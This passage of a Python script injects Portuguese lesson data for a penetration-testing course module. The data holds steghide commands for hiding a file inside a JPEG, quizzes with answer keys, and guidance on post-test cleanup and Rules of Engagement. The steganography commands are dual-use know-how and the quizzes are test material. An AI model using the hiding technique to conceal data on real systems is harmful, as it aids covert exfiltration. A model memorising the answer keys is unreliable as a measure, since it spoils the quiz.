        "code": "# 1. Embutindo o arquivo secreto na foto de cobertura (-cf = cover file, -ef = embed file):\n$ steghide embed -cf foto.jpg -ef segredo.txt -p 'cyberduo123'\n\n# 2. Extraindo o arquivo secreto da imagem contaminada (-sf = stego file):\n$ steghide extract -sf foto.jpg -p 'cyberduo123'",
        "takeaway": "O resultado do comando embed gera um arquivo idêntico visualmente à foto original, mas com os dados ocultos."
      },
      {
        "type": "fill",
        "sentence": "No utilitário steghide, o parâmetro que especifica o arquivo de cobertura ou disfarce original (como foto.jpg) é o ___, enquanto o parâmetro para extrair os dados do arquivo esteganográfico é o -sf.",
        "options": [
          "-cf",
          "-ef",
          "-p"
        ],
        "correctText": "-cf",
        "explanation": "O parâmetro -cf define o 'cover file' (a mídia inocente que servirá de disfarce) e -ef aponta para o 'embedded file' (o payload secreto)."
      },
      {
        "type": "teach",
        "icon": "fa-broom",
        "title": "Como Cobrir Rastros e Limpar Sistemas (Cisco 8.2.7)",
        "content": "Após concluir com sucesso os testes de penetração, o pentester deve <b>limpar e higienizar todos os sistemas afetados</b> para devolvê-los exatamente ao estado de integridade e disponibilidade em que os encontrou:<br><br>🧼 <b>Etapas de Limpeza Críticas</b>:<br>• Excluir todas as contas locais e de domínio criadas para o teste.<br>• Remover todas as ferramentas, scripts, daemons e arquivos de backdoor instalados nos discos.<br>• Restaurar configurações de rede, portas de firewall e logs originais.<br>• Seguir as diretrizes internacionais da publicação <b>NIST SP 800-88 Rev 1 (Guidelines for Media Sanitization)</b> para destruir dados de testes em mídias de armazenamento com segurança total, impedindo a recuperação de informações confidenciais do cliente.",
        "highlight": "A limpeza é uma obrigação ética e profissional. Deixar ferramentas instaladas no cliente é um risco severo de brecha de segurança real!"
      },
      {
        "type": "match",
        "title": "Mapeando Boas Práticas de Limpeza (Cisco 8.2.7)",
        "pairs": [
          {
            "term": "Excluir contas de teste",
            "definition": "Remover credenciais extras criadas durante o engajamento"
          },
          {
            "term": "NIST SP 800-88",
            "definition": "Diretrizes e boas práticas para Sanitização de Mídia"
          },
          {
            "term": "Remover dados do cliente",
            "definition": "Apagar dados sensíveis das máquinas do atacante pós-relatório"
          },
          {
            "term": "Remover daemons/backdoors",
            "definition": "Garantir que nenhum serviço ou porta dos fundos continue ativa"
          }
        ]
      },
      {
        "type": "quiz",
        "task": "Em qual etapa do planejamento do teste de penetração o auditor deve discutir, alinhar e documentar junto ao cliente os critérios exatos e autorizações para limpeza de sistemas e remoção de dados pós-teste?",
        "options": [
          "Na fase de pré-engajamento, formalizando tudo nas Regras de Engajamento (Rules of Engagement - ROE).",
          "Durante a execução da pós-exploração, decidindo na hora conforme julgar conveniente.",
          "Essa atividade não deve ser discutida com o cliente, ficando a cargo exclusivo da equipe de TI dele."
        ],
        "correctText": "Na fase de pré-engajamento, formalizando tudo nas Regras de Engajamento (Rules of Engagement - ROE).",
        "explanation": "Para proteger a responsabilidade jurídica e garantir que sistemas de produção não sejam danificados durante a limpeza, todas as diretrizes e limites devem constar no ROE."
      }
    ],
    "victory_title": "PARABÉNS! ACESSO E EXFILTRAÇÃO DOMINADOS!",
    "victory_msg": "Você completou o Módulo 8 com louvor! Você domina técnicas de persistência, movimentação lateral furtiva, escalada de privilégios e higienização pós-teste no padrão de excelência da Cisco."
  }
]

# Adicionar as novas lições reestruturadas
lessons.extend(module_8_lessons)

# Salvar de volta no banco de definições
with open(JSON_PATH, 'w', encoding='utf-8') as f:
    json.dump(lessons, f, ensure_ascii=False, indent=2)

print(f"✅ Definições do Módulo 8 injetadas com sucesso! ({len(module_8_lessons)} lições)")
